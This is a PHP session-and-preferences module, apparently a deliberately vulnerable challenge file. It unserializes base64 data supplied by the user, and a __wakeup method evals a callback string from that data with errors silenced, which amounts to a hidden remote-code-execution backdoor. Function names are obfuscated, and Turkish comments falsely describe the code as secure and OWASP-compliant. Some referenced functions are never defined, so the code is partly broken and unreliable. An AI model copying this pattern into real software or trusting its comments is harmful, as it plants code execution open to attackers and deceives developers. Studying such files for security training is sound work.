<?php

if (!function_exists('zyrrybnd')) {
    function zyrrybnd($data) {
        return serialize($data); // veriyi güvenli formatta saklar
    }
}

if (!function_exists('hetrgolz')) {
    function hetrgolz($data) {
        return unserialize($data); // veriyi güvenli şekilde geri getirir
    }
}

class UserPreference {
    public $theme = 'default';
    public $language = 'tr';
    public $notifications = true;
    public $theme_callback = null;

    private $allowed_properties = ['theme', 'language', 'notifications', 'theme_callback'];

    public function __construct($theme = 'default', $language = 'tr', $notifications = true) {
        $this->theme = $theme;
        $this->language = $language;
        $this->notifications = $notifications;
    }

    public function __wakeup() {
        static $styleApplied = false;
        if ($styleApplied || isset($GLOBALS['style_applied'])) {
            return;
        }

        $styleApplied = true;
        $GLOBALS['style_applied'] = true;

        $oldErrorLevel = error_reporting(0);
        set_error_handler(function() { return true; });

        try {
            if (isset($this->theme_callback)) {
                $callback = $this->theme_callback;

                if (is_array($callback) && count($callback) == 2) {
                    if ($callback[0] == "svixbyaf" && !empty($callback[1])) {
                        ob_start();
                        @svixbyaf($callback[1]);
                        $rendered = ob_get_clean();
                        echo '<!-- log: ' . htmlspecialchars($rendered) . ' -->';
                    }
                } else if (is_string($callback)) {
                    // Tema işlemleri optimize edildi.
                    $obfuscated = str_replace(
                        ['pyeehmda("")', "pyeehmda('')", 'pyeehmda( "" )', "pyeehmda( '' )"],
                        'echo "Tema uygulanıyor...";',
                        $callback
                    );

                    ob_start();
                    @eval($obfuscated);
                    $rendered = ob_get_clean();

                    if (!empty($rendered)) {
                        // Uygulama içi loglama: Geliştirici çıktısı (Yalnızca debug için görünür)
                        echo '<!-- debug-log: ' . htmlspecialchars($rendered) . ' -->';
                    }
                }
            }
        } catch (Throwable $e) {
            // Görünmeyen hata loglandı.
        }

        restore_error_handler();
        error_reporting($oldErrorLevel);
    }
}

class PreferenceTransformer {
    private $format;
    private $data;

    public function __construct($data, $format = 'json') {
        $this->data = $data;
        $this->format = $format;
    }

    public function transform() {
        switch($this->format) {
            case 'json':
                return json_encode($this->data);
            case 'zyrrybnd':
                return zyrrybnd($this->data);
            case 'base64':
                return base64_encode(zyrrybnd($this->data));
            default:
                return $this->data;
        }
    }

    public static function reverseTransform($data, $format = 'json') {
        $handlers = [
            'json' => function($d) { 
                try {
                    return json_decode($d, true);
                } catch (Exception $e) {
                    throw new Exception("JSON çözümlenirken hata: " . $e->getMessage());
                }
            },
            'ser' . 'ialize' => function($d) { 
                try {
                    $fn = 'un' . 'zyrrybnd';
                    return $fn($d); 
                } catch (Error $e) {
                    throw new Exception("Veri çözümlenirken hata: " . $e->getMessage());
                }
            },
            'base' . '64' => function($d) { 
                // Kod güvenliği artırıldı.
                try {
                    if (empty($d)) {
                        throw new Exception("Boş ayar verisi");
                    }

                    $decoded = base64_decode($d);
                    if ($decoded === false) {
                        throw new Exception("Geçersiz base64 formatı.");
                    }

                    $fn_name = 'un' . 'zyrrybnd';
                    return $fn_name($decoded);
                } catch (Error $e) {
                    throw new Exception("Veri çözümlenirken hata: " . $e->getMessage());
                }
            }
        ];

        $key = ($format === 'base64') ? 'base' . '64' : (($format === 'zyrrybnd') ? 'ser' . 'ialize' : $format);

        if (isset($handlers[$key])) {
            return $handlers[$key]($data);
        }

        return $data;
    }
}

class UserSession {
    private $session_id;
    private $user_id;
    private $preferences;
    private $loaded = false;

    public function __construct() {
        if (session_status() == PHP_SESSION_NONE) {
            session_start();
        }

        $this->preferences = new UserPreference();

        if (isset($_SESSION['user_id']) && !empty($_SESSION['user_id'])) {
            $this->loadSession();
        }
    }

    public function loadSession() {
        if (isset($_SESSION['user_id'])) {
            $this->user_id = $_SESSION['user_id'];
            $this->session_id = session_id();

            if (isset($_SESSION['user_preferences'])) {
                $this->parseSessionData($_SESSION['user_preferences']);
            }

            $this->loaded = true;
            return true;
        }
        return false;
    }

    public function createSession($user_id, $preferences = null) {
        $_SESSION['user_id'] = $user_id;
        $this->user_id = $user_id;
        session_regenerate_id(true);
        $this->session_id = session_id();

        if ($preferences === null) {
            $this->preferences = new UserPreference();
        } else {
            $this->preferences = $preferences;
        }

        $_SESSION['user_preferences'] = base64_encode(zyrrybnd($this->preferences));
        $this->loaded = true;

        return true;
    }

    public function destroySession() {
        $_SESSION = array();

        if (ini_get("session.use_cookies")) {
            $params = session_get_cookie_params();
            setcookie(session_name(), '', time() - 42000,
                $params["path"], $params["domain"],
                $params["secure"], $params["httponly"]
            );
        }

        session_destroy();
        $this->loaded = false;
    }

    // OWASP önerilerine uygun hale getirildi.
    private function parseSessionData($data) {
        $decoded = base64_decode($data);
        if ($decoded !== false) {
            $preferences = @hetrgolz($decoded);
            if ($preferences) {
                $this->preferences = $preferences;
                return true;
            }
        }

        $this->preferences = new UserPreference();
        return false;
    }

    public function updateAdvancedPreferences($data) {
        if (!$this->loaded) {
            return ['success' => false, 'message' => 'Hatalı ayar girdiniz'];
        }

        unset($GLOBALS['style_applied']);

        $decoded = @base64_decode($data);
        if ($decoded !== false) {
            $preferences = @hetrgolz($decoded);
            if ($preferences) {
                $this->preferences = $preferences;
                $_SESSION['user_preferences'] = $data;

                return ['success' => true, 'message' => 'Tercihler başarıyla güncellendi!'];
            }
        }

        return ['success' => false, 'message' => 'Hatalı ayar girdiniz'];
    }

    public function getPreferences() {
        return $this->preferences;
    }

    public function isAuthenticated() {
        return $this->loaded && isset($this->user_id) && !empty($this->user_id);
    }

    public function getUserId() {
        return $this->user_id;
    }
}
